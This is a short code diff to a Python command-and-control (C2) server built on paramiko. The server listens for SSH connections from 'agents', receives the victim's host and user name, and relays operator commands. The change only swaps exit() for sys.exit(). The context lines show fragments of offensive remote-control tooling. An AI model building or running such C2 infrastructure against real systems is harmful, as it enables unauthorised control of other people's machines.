@@ -1,6 +1,7 @@
 import paramiko
 import socket
 import argparse
+import sys
 from time import sleep
 
 parser = argparse.ArgumentParser(description="C2 server configuration to listen for agents")
@@ -35,7 +36,7 @@ def main():
         print(f"[+] Port: {port} | User: {args.user} | Password: {args.password}\n[*] Listening for connections...")
         client, addr = sock.accept()
     except KeyboardInterrupt:
-        exit()
+        sys.exit()
 
     C2_Session = paramiko.Transport(client)
     C2_Session.add_server_key(HOSTKEY)
@@ -45,7 +46,7 @@ def main():
     print("\n[*] Debug info:\n" + str(conn)) #Debug info
     if conn is None:
         print("[!] Failled authentication.")
-        exit()
+        sys.exit()
     success_msg = conn.recv(1024).decode()
     host = success_msg.split(",")[0]
     user = success_msg.split(",")[1]
@@ -63,7 +64,7 @@ def main():
                     comm_handler()
                 elif head == "!exit":
                     conn.send(command)
-                    exit()
+                    sys.exit()
                 else:
                     conn.send(command)
                     incoming()
@@ -72,7 +73,7 @@ def main():
                 pass
             except KeyboardInterrupt:
                 conn.send("!exit")
-                exit()
+                sys.exit()
     
     def incoming():
         try:
